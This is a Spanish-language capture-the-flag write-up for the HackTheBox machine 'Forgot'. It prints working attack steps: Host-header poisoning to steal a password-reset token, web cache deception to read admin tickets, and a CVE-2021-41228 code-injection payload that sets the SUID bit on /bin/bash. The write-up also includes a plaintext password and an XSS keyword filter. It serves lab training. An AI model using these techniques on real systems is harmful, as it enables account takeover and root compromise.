---
layout: post
title: Forgot
date: 2023-06-09
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSCP, OSWE]
---
___

<center><img src="/writeups/assets/img/Forgot-htb/Forgot.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Information Disclosure

* Abuso de caché via Reverse Proxy

* CVE-2021-41228

* Abuso de Privilegio a nivel de sudoers (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.188 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-13 09:11 GMT
Nmap scan report for 10.10.11.188
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.188 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-13 09:12 GMT
Nmap scan report for 10.10.11.188
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Tue, 13 Jun 2023 09:12:17 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 32775
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Tue, 13 Jun 2023 09:12:11 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 32770
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Tue, 13 Jun 2023 09:12:11 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     X-Varnish: 12
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=6/13%Time=648832EF%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1E2,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.1\.2\x2
SF:0Python/3\.8\.10\r\nDate:\x20Tue,\x2013\x20Jun\x202023\x2009:12:11\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:20219\r\nLocation:\x20http://127\.0\.0\.1\r\nX-Varnish:\x2032770\r\nAge
SF::\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x2
SF:0close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting
SF:\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20r
SF:edirected\x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20href
SF:=\"http://127\.0\.0\.1\">http://127\.0\.0\.1</a>\.\x20If\x20not,\x20cli
SF:ck\x20the\x20link\.\n")%r(HTTPOptions,114,"HTTP/1\.1\x20200\x20OK\r\nSe
SF:rver:\x20Werkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Tue,\x2013\x20
SF:Jun\x202023\x2009:12:11\x20GMT\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nContent-Length:\x200\r
SF:\nX-Varnish:\x2012\r\nAge:\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish
SF:/6\.2\)\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n")%r(
SF:RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOhFo
SF:urRequest,1BE,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/
SF:2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Tue,\x2013\x20Jun\x202023\x2009:
SF:12:17\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent
SF:-Length:\x20207\r\nX-Varnish:\x2032775\r\nAge:\x200\r\nVia:\x201\.1\x20
SF:varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20close\r\n\r\n<!doctype\x2
SF:0html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\
SF:x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\
SF:x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x2
SF:0please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r
SF:(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.01 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.188
http://10.10.11.188 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.8.10], IP[10.10.11.188], PasswordField[password], Python[3.8.10], Script[module], Title[Login], UncommonHeaders[x-varnish], Varnish, Via-Proxy[1.1 varnish (Varnish/6.2)], Werkzeug[2.1.2]
```

Tengo acceso a un panel de inicio de sesión

<img src="/writeups/assets/img/Forgot-htb/1.png" alt="">

Intercepto la petición con ```BurpSuite```

```null
POST /login HTTP/1.1
Host: 10.10.11.188
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.188
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.188/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __hstc=37486847.cf2c0d7ce8a81d6638f7885e6ef7ea42.1686647908509.1686647908509.1686647908509.1; hubspotutk=cf2c0d7ce8a81d6638f7885e6ef7ea42; __hssrc=1; __hssc=37486847.2.1686647908510
Connection: close

username=admin&password=admin
```

Utilizo ```SQLMap``` para probar si es vulnerable a inyección SQL

```null
sqlmap -r request.req --batch --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:25:13 /2023-06-13/


[09:25:36] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 09:25:36 /2023-06-13/
```

En las cabeceras de respuesta se puede ver que se emplea un reverse proxy llamado ```varnish```

```null
curl -s -X GET http://10.10.11.188/ -I
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 13 Jun 2023 09:26:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5186
X-Varnish: 131294
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: keep-alive
```

Aplico fuzzing para descubrir rutas


En ```/reset``` se puede modificar la contraseña de los usuarios

<img src="/writeups/assets/img/Forgot-htb/2.png" alt="">

Al introducir cualquiera al azar, en la respuesta aparece el mensaje ```Invalid Token```. Desde ```/forgot``` puedo enumerar usuarios

<img src="/writeups/assets/img/Forgot-htb/3.png" alt="">

Intercepto la petición para ver como se tramita

```null
GET /forgot?username=test HTTP/1.1
Host: 10.10.11.188
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: */*
Referer: http://10.10.11.188/forgot
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __hstc=37486847.cf2c0d7ce8a81d6638f7885e6ef7ea42.1686647908509.1686647908509.1686647908509.1; hubspotutk=cf2c0d7ce8a81d6638f7885e6ef7ea42; __hssrc=1; __hssc=37486847.5.1686647908510
Connection: close
```

Con ```wfuzz``` aplico fuerza bruta

```null
wfuzz -c -t 200 --sc=200 -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -H "Cookie: __hstc=37486847.cf2c0d7ce8a81d6638f7885e6ef7ea42.1686647908509.1686647908509.1686647908509.1; hubspotutk=cf2c0d7ce8a81d6638f7885e6ef7ea42; __hssrc=1; __hssc=37486847.5.1686647908510" 'http://10.10.11.188/forgot?username=FUZZ'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.188/forgot?username=FUZZ
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000001640:   200        0 L      2 W        16 Ch       "cassie"                                                                                                                                        
000003316:   200        0 L      2 W        16 Ch       "faye"
```

Es probable que después el servidor pete y sea necesario esperar un tiempo o resetear la máquina

```null
curl -s -X GET http://10.10.11.188/
<!DOCTYPE html>
<html>
  <head>
    <title>503 Backend fetch failed</title>
  </head>
  <body>
    <h1>Error 503 Backend fetch failed</h1>
    <p>Backend fetch failed</p>
    <h3>Guru Meditation:</h3>
    <p>XID: 9076832</p>
    <hr>
    <p>Varnish cache server</p>
  </body>
</html>
```

En el código fuente se puede ver un usuario en un comentario

<img src="/writeups/assets/img/Forgot-htb/4.png" alt="">

Lo introduzco en ```/forgot``` y se envía el link a un correo electrónico

<img src="/writeups/assets/img/Forgot-htb/5.png" alt="">

Intercepto la petición y modifico la cabecera ```Host``` para que valga mi IP

```null
Host: 10.10.16.4
```

Recibo el token en un servicio HTTP con ```python```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.188 - - [13/Jun/2023 09:54:05] code 404, message File not found
10.10.11.188 - - [13/Jun/2023 09:54:05] "GET /reset?token=LanUnP8QB20cOeQe01zLoQRg6CvUiryChIhrNFozIdQ9LD7kbaN9ma3hDO%2BVFbGGVE8tKXxijGfk8%2BQKDktpUg%3D%3D HTTP/1.1" 404 -
```

Ahora si que puedo moficar la contraseña

<img src="/writeups/assets/img/Forgot-htb/6.png" alt="">

Tengo acceso a una nueva interfaz

<img src="/writeups/assets/img/Forgot-htb/7.png" alt="">

En las cabeceras de respuesta de ```/tickets``` aparece una cabecera ```Age``` con valor 0

```null
curl -s -X GET http://10.10.11.188/tickets -H "Cookie: __hstc=37486847.cf2c0d7ce8a81d6638f7885e6ef7ea42.1686647908509.1686647908509.1686647908509.1; hubspotutk=cf2c0d7ce8a81d6638f7885e6ef7ea42; __hssrc=1; session=30281b4d-9772-4409-ae01-48e8bf8df5c5; __hssc=37486847.13.1686647908510" -I

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 13 Jun 2023 10:03:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7610
Set-Cookie: session=30281b4d-9772-4409-ae01-48e8bf8df5c5; HttpOnly; Path=/
X-Varnish: 196624
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: keep-alive
```

Si elimino la cookie ```session``` hace un redirect a la raíz

```null
curl -s -X GET http://10.10.11.188/tickets -H "Cookie: __hstc=37486847.cf2c0d7ce8a81d6638f7885e6ef7ea42.1686647908509.1686647908509.1686647908509.1; hubspotutk=cf2c0d7ce8a81d6638f7885e6ef7ea42; __hssrc=1" -I
HTTP/1.1 302 FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 13 Jun 2023 10:05:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
X-Varnish: 78
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive
```

La ruta ```/static``` la utiliza el reverse proxy como almacenamiento caché. Intento cargar recursos de una ruta que no existe. Devuelve ```cache-control``` y el ```Age``` se modifica. Dado que se está cacheando, va a tomar como prioritario la autenticación desde el almacenamiento por lo que se puede tratar de leer tickets de usuarios administradores sin disponer sus credenciales

```null
curl -s -X GET http://10.10.11.188/static/rubbx -H "Cookie: __hstc=37486847.cf2c0d7ce8a81d6638f7885e6ef7ea42.1686647908509.1686647908509.1686647908509.1; hubspotutk=cf2c0d7ce8a81d6638f7885e6ef7ea42; __hssrc=1" -I
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 13 Jun 2023 09:59:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 196636 294933
Age: 388
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive
```

La sección ```Tickets(Escalated)``` corresponde a la ruta ```/admin_tickets```

<img src="/writeups/assets/img/Forgot-htb/8.png" alt="">

En caso de que un usuario Administrador cachée su contenido, podré verlo sin necesidad de emplear una cookie de sesión. En ```/escalate``` hay un formulario desde el cual puedo enviar un link

<img src="/writeups/assets/img/Forgot-htb/9.png" alt="">

Le envío el enlace ```http://10.10.11.188/admin_tickets/static/js/pwned.js```. Pasado un tiempo al introducirlo en el navegador, puedo ver la página como si fuera el otro usuario, a través del enlace con la caché

<img src="/writeups/assets/img/Forgot-htb/10.png" alt="">

Gano acceso por SSH y puedo ver la primera flag

```null
sshpass -p 'dCb#1!x0%gjq' ssh diego@10.10.11.188
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-132-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 13 Jun 2023 01:54:43 PM UTC

  System load:           0.0
  Usage of /:            65.7% of 8.72GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             219
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.188
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4bb3


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 18 10:51:30 2022 from 10.10.14.40
diego@forgot:~$ cat user.txt 
a3f9f81a8f1e7561a4d02d5488226725
```

# Escalada

Tengo un privilegio a nivel de sudoers

```null
diego@forgot:~$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```

No dispongo de capacidad de escritura

```null
diego@forgot:~$ ls -l /opt/security/ml_security.py
-rwxr-xr-x 1 root root 5644 Nov 14  2022 /opt/security/ml_security.py
```

Al ejecutarlo devuelve muchos errores

```null
diego@forgot:~$ python3 /opt/security/ml_security.py
/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (3.0.4) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
2023-06-13 14:02:41.042062: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2023-06-13 14:02:41.042119: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
Traceback (most recent call last):
  File "/opt/security/ml_security.py", line 125, in <module>
    ynew1 = loaded_model1.predict(Xnew)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/tree/_classes.py", line 437, in predict
    X = self._validate_X_predict(X, check_input)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/tree/_classes.py", line 402, in _validate_X_predict
    X = self._validate_data(X, dtype=DTYPE, accept_sparse="csr",
  File "/usr/local/lib/python3.8/dist-packages/sklearn/base.py", line 421, in _validate_data
    X = check_array(X, **check_params)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/utils/validation.py", line 63, in inner_f
    return f(*args, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/sklearn/utils/validation.py", line 637, in check_array
    raise ValueError(
ValueError: Expected 2D array, got 1D array instead:
array=[].
Reshape your data either using array.reshape(-1, 1) if your data has a single feature or array.reshape(1, -1) if it contains a single sample.
```

Contiene el siguiente código

```null
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

# Create a function to convert an array of strings to a set of features
def getVec(text):
    features = []
    for i, line in enumerate(text):
        test_data = word_tokenize(line.lower())
        v1 = model.infer_vector(test_data)
        featureVec = v1
        lineDecode = unquote(line)
        lowerStr = str(lineDecode).lower()
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
        feature1 += int(lowerStr.count('form'))
        feature1 += int(lowerStr.count('embed'))
        feature1 += int(lowerStr.count('ilayer'))
        feature1 += int(lowerStr.count('layer'))
        feature1 += int(lowerStr.count('style'))
        feature1 += int(lowerStr.count('applet'))
        feature1 += int(lowerStr.count('meta'))
        feature1 += int(lowerStr.count('img'))
        feature1 += int(lowerStr.count('iframe'))
        feature1 += int(lowerStr.count('marquee'))
        # add feature for malicious method count
        feature2 = int(lowerStr.count('exec'))
        feature2 += int(lowerStr.count('fromcharcode'))
        feature2 += int(lowerStr.count('eval'))
        feature2 += int(lowerStr.count('alert'))
        feature2 += int(lowerStr.count('getelementsbytagname'))
        feature2 += int(lowerStr.count('write'))
        feature2 += int(lowerStr.count('unescape'))
        feature2 += int(lowerStr.count('escape'))
        feature2 += int(lowerStr.count('prompt'))
        feature2 += int(lowerStr.count('onload'))
        feature2 += int(lowerStr.count('onclick'))
        feature2 += int(lowerStr.count('onerror'))
        feature2 += int(lowerStr.count('onpage'))
        feature2 += int(lowerStr.count('confirm'))
        # add feature for ".js" count
        feature3 = int(lowerStr.count('.js'))
        # add feature for "javascript" count
        feature4 = int(lowerStr.count('javascript'))
        # add feature for length of the string
        feature5 = int(len(lowerStr))
        # add feature for "<script"  count
        feature6 = int(lowerStr.count('script'))
        feature6 += int(lowerStr.count('<script'))
        feature6 += int(lowerStr.count('&lt;script'))
        feature6 += int(lowerStr.count('%3cscript'))
        feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
        # add feature for special character count
        feature7 = int(lowerStr.count('&'))
        feature7 += int(lowerStr.count('<'))
        feature7 += int(lowerStr.count('>'))
        feature7 += int(lowerStr.count('"'))
        feature7 += int(lowerStr.count('\''))
        feature7 += int(lowerStr.count('/'))
        feature7 += int(lowerStr.count('%'))
        feature7 += int(lowerStr.count('*'))
        feature7 += int(lowerStr.count(';'))
        feature7 += int(lowerStr.count('+'))
        feature7 += int(lowerStr.count('='))
        feature7 += int(lowerStr.count('%3C'))
        # add feature for http count
        feature8 = int(lowerStr.count('http'))
        
        # append the features
        featureVec = np.append(featureVec,feature1)
        featureVec = np.append(featureVec,feature2)
        featureVec = np.append(featureVec,feature3)
        featureVec = np.append(featureVec,feature4)
        featureVec = np.append(featureVec,feature5)
        featureVec = np.append(featureVec,feature6)
        featureVec = np.append(featureVec,feature7)
        featureVec = np.append(featureVec,feature8)
        features.append(featureVec)
    return features


# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
        data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

# show the sample inputs and predicted outputs
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass

for i in range(len(Xnew)):
     t = threading.Thread(target=assessData, args=(i,))
#     t.daemon = True
     t.start()
```

Se está empleando la liberería ```tensorflow```. En este [artículo](https://stackoverflow.com/questions/38549253/how-to-find-which-version-of-tensorflow-is-installed-in-my-system) indican como extraer la versión

```null
diego@forgot:~$ python3 -c 'import tensorflow as tf; print(tf.__version__)' 2>/dev/null
2.6.3
```

Busco por vulnerabilidades asociadas en [Synk](https://security.snyk.io/package/pip/tensorflow). Parece ser vulnerable al [CVE-2021-41228](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408). Encuentro un POC en [Github](https://github.com/advisories/GHSA-75c9-jrh4-79mc). Modifico la bash para que sea SUID. Se puede hacer a través del formulario, ya que se conecta a esa misma base de datos

```null
Pwned=Exec("""Import Os\Nos.System("Chmod 4755 /Bin/Bash")""");#<Script>Alert(1)</Script>
```

Ejecuto y puedo ver la segunda flag

```null
diego@forgot:~$ sudo /opt/security/ml_security.py
2023-06-13 14:37:07.491579: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2023-06-13 14:37:07.491963: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
chmod: invalid mode: ‘u’
Try 'chmod --help' for more information.
chmod: invalid mode: ‘u’
Try 'chmod --help' for more information.
diego@forgot:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
diego@forgot:~$ bash -p
bash-5.0# cat /root/root.txt
e328645fd660e814a9e55ac5f6ac3dcb
```

También se puede hacer insertando la query manualmente

```null
mysql> insert into escalate (reason) values ('pwned=exec("""import os\nos.system("chmod 4755 /bin/bash")""")');
Query OK, 1 row affected (0.00 sec)
```